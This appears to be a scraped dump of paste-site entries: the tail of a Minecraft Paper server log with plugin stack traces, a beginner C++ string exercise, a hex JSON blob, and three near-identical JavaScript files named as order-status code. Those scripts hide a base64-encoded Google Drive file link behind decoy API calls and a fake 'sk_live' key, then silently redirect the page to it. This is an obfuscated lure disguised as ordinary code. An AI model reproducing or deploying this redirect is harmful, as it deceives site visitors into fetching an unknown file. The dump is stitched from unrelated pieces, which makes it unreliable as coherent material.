	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:22:49] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:22:52] [Server thread/INFO]: JustCheburek issued server command: /joingame clouds
[14:23:01] [Server thread/INFO]: JustCheburek issued server command: /kill
[14:23:01] [Server thread/INFO]: [JustCheburek: Killed JustCheburek]
[14:23:19] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:23:19] [Server thread/WARN]: No config found for player: JustCheburek
[14:23:25] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:23:25] [Server thread/WARN]: No config found for player: JustCheburek
[14:23:33] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:23:33] [Server thread/WARN]: No config found for player: JustCheburek
[14:27:06] [Server thread/INFO]: JustCheburek issued server command: /akro reload
[14:27:06] [Server thread/INFO]: [Akropolis] Loaded custom menu selector.
[14:27:06] [Server thread/INFO]: [Akropolis] Loaded custom menu teleport.
[14:27:06] [Server thread/INFO]: [Akropolis] Loaded custom menu pillars.
[14:27:06] [Server thread/INFO]: [Akropolis] No holograms to load!
[14:27:06] [Server thread/INFO]: [Akropolis] Loaded 11 plugin modules.
[14:27:36] [Server thread/INFO]: JustCheburek issued server command: /akro reload
[14:27:36] [Server thread/INFO]: [Akropolis] Loaded custom menu selector.
[14:27:36] [Server thread/INFO]: [Akropolis] Loaded custom menu teleport.
[14:27:36] [Server thread/INFO]: [Akropolis] Loaded custom menu pillars.
[14:27:36] [Server thread/INFO]: [Akropolis] No holograms to load!
[14:27:36] [Server thread/INFO]: [Akropolis] Loaded 11 plugin modules.
[14:27:40] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Башни удачи
[14:27:40] [Server thread/WARN]: No config found for player: JustCheburek
[14:27:40] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:27:42] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Башни удачи
[14:27:42] [Server thread/WARN]: No config found for player: JustCheburek
[14:27:42] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:27:42] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:27:42] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.handleCommand(ServerGamePacketListenerImpl.java:2424) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.craftbukkit.entity.CraftPlayer.chat(CraftPlayer.java:755) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at Akropolis-1.8.1.jar/team.devblook.akropolis.action.actions.CommandAction.execute(CommandAction.java:35) ~[Akropolis-1.8.1.jar:?]
	at Akropolis-1.8.1.jar/team.devblook.akropolis.action.ActionManager.lambda$executeActions$1(ActionManager.java:65) ~[Akropolis-1.8.1.jar:?]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[?:?]
	at Akropolis-1.8.1.jar/team.devblook.akropolis.action.ActionManager.executeActions(ActionManager.java:56) ~[Akropolis-1.8.1.jar:?]
	at Akropolis-1.8.1.jar/team.devblook.akropolis.inventory.inventories.CustomGUI.lambda$build$0(CustomGUI.java:78) ~[Akropolis-1.8.1.jar:?]
	at Akropolis-1.8.1.jar/team.devblook.akropolis.inventory.InventoryListener.onInventoryClick(InventoryListener.java:50) ~[Akropolis-1.8.1.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor246.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.handleContainerClick(ServerGamePacketListenerImpl.java:3122) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.game.ServerboundContainerClickPacket.handle(ServerboundContainerClickPacket.java:69) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.game.ServerboundContainerClickPacket.handle(ServerboundContainerClickPacket.java:33) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:56) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:27:45] [Server thread/INFO]: JustCheburek issued server command: /kill
[14:27:45] [Server thread/INFO]: [JustCheburek: Killed JustCheburek]
[14:27:51] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Башни удачи
[14:27:51] [Server thread/WARN]: No config found for player: JustCheburek
[14:27:51] [Server thread/INFO]: JustCheburek issued server command: /joingame random
"
F3Upkcr8,Order.js,reflezzzz,JavaScript,Monday 31st of March 2025 06:31:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/917/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rwRCnF0w,Untitled,dllbridge,C,Monday 31st of March 2025 06:20:32 AM CDT,"

#include   <stdio.h>
#include  <iostream>
#include    <string>
#include   <string.h>
using namespace std; 


string      s_1   =       ""SONY"";



////////////////////////////////////////////////////////////////////
int main()                                                        //
{


    for(int i = 0; i < 4; i++)
    {
		
	    cout << s_1[i] << "", "";	
		
	}

}


















/*
#include   <stdio.h>
#include  <iostream>
//#include    <string>
#include   <string.h>
using namespace std; 


string      s_1   =       ""SONY"";

char     sz_1[73] = ""_Pictures."";

////////////////////////////////////////////////////////////////////
int main()                                                        //
{

    s_1 += sz_1;

	cout << ""1: "" << s_1 << endl;

	printf(""The length of \""str_1\"" = %d \n"", s_1.length());

    strcpy(sz_1, s_1.c_str());
	
	printf( ""2: %s \n"", sz_1);

return 0;
}

*/



















/*

#include  <iostream>
#include  <stdio.h>
using namespace std;



///////////////////////////////////////////////////
int main()                                       // 
{


    string s1 =    ""SONY "";
    string s2 = ""Pictures"";   
    string s3 =         s1;
	
	 	 
    cout << s1 << ""\n"";
    cout << s2 << '\n';    
    cout << s3 << endl; 
}





*/












/*
#include  <iostream>
#include  <stdio.h>
using namespace std;



///////////////////////////////////////////////////
int main()                                       // 
{


    string s1 =     ""SONY"";
    string s2 = ""Pictures"";   
    string s3 = ""United States of America""; 	 
    cout << s1 << ""\n"";
    cout << s2 << '\n';    
    cout << s3 << endl; 
}


*/




















/*

#include <stdio.h>


int main()
{

	int n, 
	    n_1 = 5,  //   101
	    n_2 = 4;  //   100
	              //   111  |
	              //   100
	    
	//1)n = n_1 && n_2;
    n = n_1 & n_2;
	//3)n = n_1 || n_2;

	printf("" n = %d"", n);
}


*/






"
1GwXjn9Z,Untitled,reflezzzz,JavaScript,Monday 31st of March 2025 06:00:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/557/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
d6UiKcC6,dataNone,TestGuy1,JSON,Monday 31st of March 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '03716038e82f083d2fdd2cc768a405cf910a91f798fc0d1afd3a3b6b8b959bbcbd875a3194d346a364484dbd1c1cf5b7d93e4b1b8b7e9ab99e02b5bf345f1a39c158a841e6b65356ba891a993eed1030032950e4ad8affc2c5673b7b3fc91d9df516ebb5fcc455f3544a700771d327097aaffcf101344f59a8efb942bb935360',
  otherdata: [
    '05a1ec4fbac3bd327f4fffc3218484bc',
    'af53df4ebdd52674751a1ceb5bc4b90a',
    'a7b17850e41836d97c0df8d395bc8471',
    'fb77c25a4feb7a6ab036935d8d3b1f1c',
    'c02479974bd7e99f84e4851022db891b',
    'eed1723a71c36a3db564c6e3a83954dc',
    '71ae2d834e4b0f82ebe5c0a083e41f75',
    '13f06d7f1db87805723fe8ee22307bf1'
  ]
}"
SXetZHY3,Products.js,reflezzzz,JavaScript,Monday 31st of March 2025 05:45:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/502/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
